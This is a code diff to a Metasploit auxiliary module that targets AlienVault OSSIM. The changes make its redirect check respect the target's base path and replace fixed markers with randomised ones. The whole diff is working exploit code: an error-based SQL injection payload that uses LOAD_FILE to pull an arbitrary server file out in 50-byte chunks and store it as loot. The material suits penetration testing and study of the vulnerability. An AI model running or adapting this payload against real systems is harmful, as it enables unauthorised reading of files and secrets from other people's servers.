@@ -63,7 +63,7 @@ class Metasploit4 < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    if res.headers['Location'] != '/ossim/'
+    if res.headers['Location'] != normalize_uri(target_uri.path, 'ossim/')
       fail_with('Authentication failed')
     end
 
@@ -73,11 +73,13 @@ class Metasploit4 < Msf::Auxiliary
     i = 0
     full = ''
     filename = datastore['FILEPATH'].unpack("H*")[0]
+    left_marker = Rex::Text.rand_text_alpha(6)
+    right_marker = Rex::Text.rand_text_alpha(6)
 
     while !done
-      pay =  "2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x7175777471,"
+      pay =  "2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
       pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),"
-      pay << "0x20)),#{(50*i)+1},50)),0x7169716d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
+      pay << "0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
       pay << " GROUP BY x)a) AND 'xnDa'='xnDa"
 
       get = {
@@ -91,7 +93,7 @@ class Metasploit4 < Msf::Auxiliary
         'vars_get' => get
       })
 
-      file = /quwtq(.*)qiqmq/.match(res.body)
+      file = /#{left_marker}(.*)#{right_marker}/.match(res.body)
 
       file = file[1]
 
@@ -104,7 +106,6 @@ class Metasploit4 < Msf::Auxiliary
       vprint_status(str)
 
       i = i+1
-
     end
 
     path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])
